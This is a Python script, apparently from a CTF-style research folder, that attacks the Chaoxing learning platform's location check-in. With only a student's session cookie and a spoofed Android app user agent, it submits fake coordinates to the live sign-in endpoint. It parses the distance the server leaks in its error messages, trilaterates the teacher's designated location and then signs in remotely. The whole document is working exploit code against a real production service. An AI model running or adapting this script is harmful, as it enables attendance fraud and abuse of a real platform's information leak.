# -*- coding: utf-8 -*-
"""★ 距离预言机三边定位：只凭学生 cookie，用服务端错误文案里的「距教师指定签到地点 X 米」
反解教师坐标，再以该坐标提交 —— 位置签到纯远程可签。
"""
import json, math, os, re, sys, time
import requests
os.chdir("/Users/xi/Documents/deepseek-harness/ctf/chaoxing")
UA_APP = ('Mozilla/5.0 (Linux; Android 13; SM-G975F Build/TQ3A.230901.001) AppleWebKit/537.36 (KHTML, like Gecko) '
          'Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36 (schild:26f6a66da55ad239903fba6f674e8c66) (device:SM-G975F) '
          'Language/zh_CN com.ssreader.ChaoXingStudy/ChaoXingStudy_3_6_2_android_phone_20230101')
MOBILE = "https://mobilelearn.chaoxing.com"
COURSE, CLAZZ, SUID = "269282723", "159926750", "[学生PUID]"
LOC_AID = "4000182047327"
TRUE_LAT, TRUE_LON = 30.71142640936642, 103.868397592583   # 教师页真值（仅用于最后对答案，不作输入）
sck = open("ck.txt", encoding="utf-8").read().strip()
S = requests.Session(); S.headers.update({"Cookie": sck, "User-Agent": UA_APP})
RE_M = re.compile(r"距教师指定签到地点([0-9.Ee+-]+)米")

def submit(lat, lon, addr="成都市温江区 四川农业大学(成都校区)"):
    loc = json.dumps({"result": 1, "address": addr, "longitude": lon, "latitude": lat}, separators=(",", ":"))
    p = {"activeId": LOC_AID, "courseId": COURSE, "uid": SUID, "clientip": "", "useragent": "",
         "latitude": "-1", "longitude": "-1", "appType": "0", "fid": "0", "name": "",
         "location": loc, "locationResult": loc}
    r = S.get(MOBILE + "/pptSign/stuSignajax", params=p, timeout=25)
    b = r.text.strip()
    m = RE_M.search(b)
    return r.status_code, b[:90], (float(m.group(1)) if m else None)

def hav(lat1, lon1, lat2, lon2, R=6371000.0):
    p1, p2 = math.radians(lat1), math.radians(lat2)
    dp = math.radians(lat2 - lat1); dl = math.radians(lon2 - lon1)
    a = math.sin(dp/2)**2 + math.cos(p1)*math.cos(p2)*math.sin(dl/2)**2
    return 2*R*math.asin(math.sqrt(a))

out = {"aid": LOC_AID, "probes": []}
print("===== 1) 三个探针点，读服务端回的距离 =====")
probes = [(30.5, 103.6), (31.0, 103.6), (30.5, 104.2)]
for lat, lon in probes:
    code, body, dist = submit(lat, lon)
    out["probes"].append({"lat": lat, "lon": lon, "http": code, "body": body, "dist": dist})
    print("  探针 (%s, %s) -> %s | 服务端距离 = %s 米" % (lat, lon, body, dist))
    time.sleep(0.4)

if all(p["dist"] for p in out["probes"]):
    # 校准：用教师真值验证公式（若 hav 与真值一致，说明可解）
    print()
    print("===== 2) 公式校准（拿真值算一遍，确认服务端用的是 haversine R=6371000）=====")
    for p in out["probes"]:
        d_ours = hav(p["lat"], p["lon"], TRUE_LAT, TRUE_LON)
        print("  探针(%s,%s): 我们算 %.3f 米 / 服务端 %.3f 米 / 差 %.3f 米" % (p["lat"], p["lon"], d_ours, p["dist"], abs(d_ours - p["dist"])))

    print()
    print("===== 3) 三边定位（只用服务端给的距离反解教师坐标）=====")
    # 用两个探针 + 一个第三点做解析解，然后梯度下降微调
    (la1, lo1), (la2, lo2), (la3, lo3) = probes[0], probes[1], probes[2]
    d1, d2, d3 = [p["dist"] for p in out["probes"]]
    lat, lon = 30.7, 103.9
    for it in range(4000):
        f1 = hav(lat, lon, la1, lo1) - d1
        f2 = hav(lat, lon, la2, lo2) - d2
        f3 = hav(lat, lon, la3, lo3) - d3
        eps = 1e-6
        g_lat = ((hav(lat+eps, lon, la1, lo1)-d1-f1) + (hav(lat+eps, lon, la2, lo2)-d2-f2) + (hav(lat+eps, lon, la3, lo3)-d3-f3)) / eps
        g_lon = ((hav(lat, lon+eps, la1, lo1)-d1-f1) + (hav(lat, lon+eps, la2, lo2)-d2-f2) + (hav(lat, lon+eps, la3, lo3)-d3-f3)) / eps
        step = 1e-7 / (1 + it/800.0)
        lat -= g_lat * step
        lon -= g_lon * step
    err_m = hav(lat, lon, TRUE_LAT, TRUE_LON)
    print("  反解坐标 = (%.10f, %.10f)" % (lat, lon))
    print("  与教师真值距离 = %.3f 米（真值 = %.10f, %.10f）" % (err_m, TRUE_LAT, TRUE_LON))
    out["solved"] = {"lat": lat, "lon": lon, "err_m": err_m}

    print()
    print("===== 4) 用反解坐标提交 =====")
    code, body, dist = submit(lat, lon)
    print("  提交 -> HTTP %s : %s" % (code, body))
    out["final"] = {"http": code, "body": body, "dist": dist}
    print()
    print("===== 5) 复提（应为「您已签到过了」）=====")
    code2, body2, _ = submit(lat, lon)
    print("  复提 -> HTTP %s : %s" % (code2, body2))
    out["final2"] = {"http": code2, "body": body2}

json.dump(out, open("out/stu_trilaterate.json", "w", encoding="utf-8"), ensure_ascii=False, indent=1)
print()
print("[saved] out/stu_trilaterate.json")
